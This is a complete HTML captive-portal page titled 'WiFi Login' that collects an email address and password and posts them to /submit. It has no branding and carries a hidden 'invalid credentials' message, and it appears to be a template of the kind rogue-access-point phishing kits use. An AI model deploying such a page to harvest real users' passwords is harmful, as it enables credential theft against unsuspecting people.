<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.1);padding:32px;width:100%;max-width:380px;margin:20px}
.logo{text-align:center;margin-bottom:24px}
.logo svg{width:48px;height:48px;fill:#0066ff}
h1{text-align:center;font-size:20px;color:#1a1a1a;margin-bottom:6px}
.sub{text-align:center;font-size:13px;color:#888;margin-bottom:24px}
.field{margin-bottom:16px}
.field label{display:block;font-size:13px;color:#555;margin-bottom:6px;font-weight:500}
.field input{width:100%;padding:12px 14px;border:1px solid #ddd;border-radius:8px;font-size:15px;outline:none;transition:border .2s}
.field input:focus{border-color:#0066ff}
.btn{width:100%;padding:14px;background:#0066ff;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}
.btn:hover{background:#0052cc}
.btn:active{background:#004099}
.help{text-align:center;margin-top:16px;font-size:12px;color:#aaa}
.err{background:#fff0f0;color:#cc0000;padding:10px;border-radius:6px;font-size:13px;text-align:center;margin-bottom:16px;display:none}
</style>
</head>
<body>
<div class="card">
<div class="logo">
<svg viewBox="0 0 24 24"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3a4.237 4.237 0 00-6 0zm-4-4l2 2a7.074 7.074 0 0110 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg>
</div>
<h1>Connect to WiFi</h1>
<div class="sub">Sign in to access the internet</div>
<div class="err" id="err">Invalid credentials. Please try again.</div>
<form method="POST" action="/submit" id="frm">
<div class="field">
<label>Email Address</label>
<input type="email" name="email" placeholder="you@example.com" required autocomplete="off">
</div>
<div class="field">
<label>Password</label>
<input type="password" name="password" placeholder="Enter password" required>
</div>
<button type="submit" class="btn">Connect</button>
</form>
<div class="help">By connecting, you agree to the network terms of service.</div>
</div>
</body>
</html>
